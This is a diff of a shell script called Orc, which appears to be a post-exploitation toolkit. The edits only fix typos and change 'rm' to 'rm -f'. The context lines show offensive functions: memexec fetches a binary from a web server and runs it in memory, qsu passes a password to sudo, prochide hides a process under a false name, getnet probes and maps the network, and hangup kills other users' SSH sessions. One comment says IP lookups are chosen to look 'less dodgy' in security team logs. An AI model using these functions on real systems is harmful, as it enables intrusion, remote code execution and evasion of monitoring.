@@ -322,7 +322,7 @@ orc_makeHome() {
   # Searchs a temporary directory without noexec flag as base. 
   for base in $(orc_listTmp); do
     if [ ! -r "$base" ] || [ ! -w "$base" ] || [ ! -x "$base" ]; then
-      # no read, no write or no searchable access
+      # no read, no write or no search-able access
       continue
     fi
     # Try to create a home directory
@@ -335,12 +335,13 @@ orc_makeHome() {
       # test and call the created script.
       # On systems (e.g. busybox) the call failed but the test pass
       if [ ! -x "$base/.q/.t" ] || ! "$base/.q/.t" 2>/dev/null; then
-	# can not create a executable
-	rm "$base/.q/.t"
-	rmdir "$base/.q"
+        # can not create a executable
+        # remove test file; use -f to prevent any prompt
+        rm -f "$base/.q/.t"
+        rmdir "$base/.q"
         continue
       fi
-      rm "$base/.q/.t"
+      rm -f "$base/.q/.t"
       # this is a good home
       HOME="$base/.q"
       return
@@ -375,7 +376,7 @@ orc_archive () {
     tar -cJf "$1.tar.xz" "$2" && ORC_ARCHIVE_FILE="$1.tar.xz"
     if [ -z "$ORC_ARCHIVE_FILE" ] && orc_existsProg xz; then
       # try tar with external xz compression
-      { tar -cf "$1.tar" "$2" && xz -9 "$1.tar" && ORC_ARCHIVE_FILE="$1.tar.xz"; } || rm "$1.tar"
+      { tar -cf "$1.tar" "$2" && xz -9 "$1.tar" && ORC_ARCHIVE_FILE="$1.tar.xz"; } || rm -f "$1.tar"
     fi
     if [ -z "$ORC_ARCHIVE_FILE" ]; then
       # try the old gzip inside tar
@@ -418,7 +419,7 @@ fi
 trap 'rm -rf $HOME' EXIT TERM INT
 
 
-# Creates a copy of this scipt in variable backup
+# Creates a copy of this script in variable backup
 # Should be start like "ENV=o.rc sh -i".
 backup=''
 if [ -n "$BASH" ]; then
@@ -561,7 +562,7 @@ orc_isMinimalOsVersion() {
   # Checks the OS name and version.
   # Arguments: OS name (e.g. Linux)
   #            First part of the version number
-  #            Second part of the version numer
+  #            Second part of the version number
   # Return: 0 if OS name is equal and version is equal or greater.
   #         1 if OS name is not equal
   #         2 if OS name is equal but version is less.
@@ -1128,18 +1129,18 @@ qsu() {
   orc_createEchoFile "$1"
   shift
   SUDO_ASKPASS="$ORC_ECHO_FILE" sudo -A "$@"
-  rm "$ORC_ECHO_FILE"
+  rm -f "$ORC_ECHO_FILE"
 }
 
 
 memexec() {
-  # Execute a binary program or a script file in-memory from webserver.
+  # Execute a binary program or a script file in-memory from web-server.
   # Stores the downloaded file in an anonymous file in the
   # /proc/self process memory.
   # If this is not possible the file is stored in the $HOME
   # directory of orc, which is typical a tmpfs.
   # Argument: URL of the binary, http or https is supported.
-  #           other arguments are passed thru to the program/script
+  #           other arguments are passed through to the program/script
   # Global:   http_proxy and https_proxy variables could be used
   #           to defined a proxy for the download.
   orc_local url interpreter
@@ -1180,7 +1181,7 @@ memexec() {
     orc_loadURL "$url" > "$HOME/.mem"
     chmod +x "$HOME/.mem"
     "$HOME/.mem" "$@"
-    rm "$HOME/.mem"
+    rm -f "$HOME/.mem"
   elif [ "$interpreter" = 'perl' ]; then
     # decode the Perl script and run the script
     ( base64 -d |
@@ -1318,7 +1319,7 @@ portscan() {
 
 fpssh() {
   # pull ssh remote host public fingerprints
-  # Argument: host name, arguments passed thru to ssh-keyscan
+  # Argument: host name, arguments passed through to ssh-keyscan
   if [ $# -lt 1 ]; then
     echo 'Error: fpssh needs host name as argument' >&2
     return 1
@@ -1331,7 +1332,7 @@ fpssh() {
 }
 
 getip() {
-#we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
+#we use akamai and google here because they're gonna look less dodgy in SOC's logs
 echo 'Attempting to get IP...'
 printf 'HTTP says: '
 	orc_loadURL 'https://whatismyip.akamai.com'
@@ -1347,7 +1348,7 @@ printf 'DNS says: '
 }
 
 prochide() {
-  # Execute a program hiden by a long program name.
+  # Execute a program hidden by a long program name.
   # Arguments: program to execute with optional arguments.
   # Method   : use the longest command line of the current running
   #            processes as name of the program to start.
@@ -1367,7 +1368,7 @@ getnet() {
   echo 'Broadcast ping is done.'
   echo "Pulling known hosts from some files and writing to $HOME/kh ..."
   orc_collectOtherHostsInfo
-  echo "Pinging local IPv4 addresse in background writing $HOME/ips ..."
+  echo "Pinging local IPv4 address in background writing $HOME/ips ..."
   orc_inetAddressAndMask |
    while read -r addr mask; do
      echo "Pinging subnet around $addr with mask $mask"
@@ -1581,7 +1582,7 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*]       hangup - terminate someones PTS by killing their SSH process.
 [*]                Very loud, DO NOT USE.
 [*]                hangup [PTS NUMBER]
-[*]      memexec - execute a binary in-memory from a webserver
+[*]      memexec - execute a binary in-memory from a web-server
 [*]                memexec [full URI] [program arguments]
 [*]     portscan - run a portscan against common ports - portscan [host]
 [*]     prochide - run a program with $0 changed to the longest entry in ps
